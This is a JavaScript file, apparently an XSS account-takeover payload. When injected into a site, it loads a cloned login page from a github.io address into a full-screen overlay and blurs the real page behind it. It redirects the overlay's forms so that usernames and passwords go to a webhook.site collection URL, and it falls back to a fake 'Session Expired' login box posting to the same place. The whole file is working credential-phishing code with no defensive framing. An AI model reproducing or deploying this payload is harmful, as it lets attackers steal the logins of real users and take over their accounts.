(function() {
    const LOGIN_PAGE_URL = 'https://swathip888a.github.io/ATO/login.html';
    const WEBHOOK_URL = 'https://webhook.site/56e6ff92-9bcb-43dd-a81a-e8a8ae428e0c';
    
    fetch(LOGIN_PAGE_URL)
        .then(response => response.text())
        .then(loginHTML => {
            // Create overlay
            const overlay = document.createElement('div');
            overlay.id = 'xss-ato-overlay';
            overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:999999;';
            
            // Put your EXACT login HTML inside a centering wrapper
            const wrapper = document.createElement('div');
            wrapper.style.cssText = 'max-width:500px;width:90%;margin:auto;';
            wrapper.innerHTML = loginHTML;  // YOUR EXACT CLONED HTML GOES HERE
            
            overlay.appendChild(wrapper);
            document.body.appendChild(overlay);
            
            // Blur background
            document.body.style.filter = 'blur(5px)';
            document.documentElement.style.filter = 'blur(5px)';
            
            // Hijack forms
            setTimeout(() => {
                document.querySelectorAll('#xss-ato-overlay form').forEach(form => {
                    form.action = WEBHOOK_URL;
                    form.method = 'POST';
                    
                    form.addEventListener('submit', function(e) {
                        const formData = new FormData(form);
                        const credentials = {};
                        formData.forEach((value, key) => credentials[key] = value);
                        
                        fetch(WEBHOOK_URL, {
                            method: 'POST',
                            mode: 'no-cors',
                            body: JSON.stringify(credentials)
                        });
                    });
                });
            }, 100);
            
            // Close overlay when clicking outside
            overlay.onclick = function(e) {
                if(e.target === overlay) {
                    overlay.remove();
                    document.body.style.filter = 'none';
                    document.documentElement.style.filter = 'none';
                }
            };
        })
        .catch(error => {
            // Fallback if fetch fails
            document.body.insertAdjacentHTML('beforeend', `
            <div id="xss-ato-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:999999;">
                <div style="background:white;padding:2rem;border-radius:8px;width:350px;">
                    <h3>Session Expired</h3>
                    <form action="${WEBHOOK_URL}" method="POST">
                        <input type="text" name="username" placeholder="Username" style="width:100%;margin:10px 0;padding:8px;" required>
                        <input type="password" name="password" placeholder="Password" style="width:100%;margin:10px 0;padding:8px;" required>
                        <button type="submit" style="width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;">Login</button>
                    </form>
                </div>
            </div>`);
        });
})();
